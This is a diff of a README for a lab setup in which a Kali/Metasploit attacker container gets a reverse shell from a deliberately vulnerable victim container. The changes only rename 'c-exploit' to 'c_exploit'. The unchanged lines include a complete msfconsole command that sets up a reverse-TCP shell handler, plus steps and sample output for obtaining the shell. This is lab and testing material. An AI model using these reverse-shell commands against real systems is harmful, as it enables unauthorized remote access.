@@ -17,20 +17,20 @@ You can use the `-x` switch with msfconsole and then specify all the msf command
 docker run -it -p 5555:5555 polyverse/kali-metasploit msfconsole -x "use multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $(docker run -it -p 5555:5555 polyverse/kali-metasploit ifconfig eth0 | grep inet | awk '{print $2}'); set LPORT 5555; exploit"
 ```
 
-### c-exploit.sh
-In this example, an attacker container (`polyverse/kali-metasploit`) will get a reverse-shell from the victim container (`polyverse/c-exploit`).
+### c_exploit.sh
+In this example, an attacker container (`polyverse/kali-metasploit`) will get a reverse-shell from the victim container (`polyverse/c_exploit`).
 
 1. In this repo, perform `pv build -r polyverse docker`. This will create the Docker container image `polyverse/kali-metasploit`.
-2. `cd ..` to move up a folder and then `git clone https://github.com/polyverse/c-exploit.git`. If you've already cloned, just go to the folder and `git pull`.
-3. `pv build docker` to create a new version of `polyverse/c-exploit`.
+2. `cd ..` to move up a folder and then `git clone https://github.com/polyverse/c_exploit.git`. If you've already cloned, just go to the folder and `git pull`.
+3. `pv build docker` to create a new version of `polyverse/c_exploit`.
 4. `cd ../kali-metasploit` to get back to the original folder.
-5. In one terminal window, launch `docker run -it --rm --privileged -p 8080:80 --name c-exploit polyverse/c-exploit`
-6. In another terminial window, run the `./c-exploit.sh` script. You can look at the script to see what it's doing, but it's basically calling the `kali-metasploit` container with sub-scripts to determine ip addresses; it also runs `msfconsole` with the `-x` option that allows you to specify all the arguments for the metasploit module in a single command line.
+5. In one terminal window, launch `docker run -it --rm --privileged -p 8080:80 --name c_exploit polyverse/c_exploit`
+6. In another terminial window, run the `./c_exploit.sh` script. You can look at the script to see what it's doing, but it's basically calling the `kali-metasploit` container with sub-scripts to determine ip addresses; it also runs `msfconsole` with the `-x` option that allows you to specify all the arguments for the metasploit module in a single command line.
 
-This is what you should see in the c-exploit window:
+This is what you should see in the c_exploit window:
 
 ```
-$ docker run -it --rm --privileged -p 8080:80 --name c-exploit polyverse/c-exploit
+$ docker run -it --rm --privileged -p 8080:80 --name c_exploit polyverse/c_exploit
 AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
 AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
 [Tue Aug 15 07:16:40.745028 2017] [mpm_prefork:notice] [pid 1] AH00163: Apache/2.4.10 (Debian) PHP/7.1.8 configured -- resuming normal operations
@@ -41,7 +41,7 @@ AH00558: apache2: Could not reliably determine the server's fully qualified doma
 And this is what you should see in the kali-metasploit window:
 
 ```
-$ ./c-exploit.sh 
+$ ./c_exploit.sh 
                                                   
                                    ____________
  [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
@@ -74,7 +74,7 @@ LPORT => 5555
 [*] done exploit.... 
 ```
 
-At this point, you should have a reverse shell in the kali-metasploit window into the c-exploit container.
+At this point, you should have a reverse shell in the kali-metasploit window into the c_exploit container.
 
 ### tcp_echo_server.sh
 Similar to c-exploit above, running "tcp_echo_server.sh" will result in output something like this:
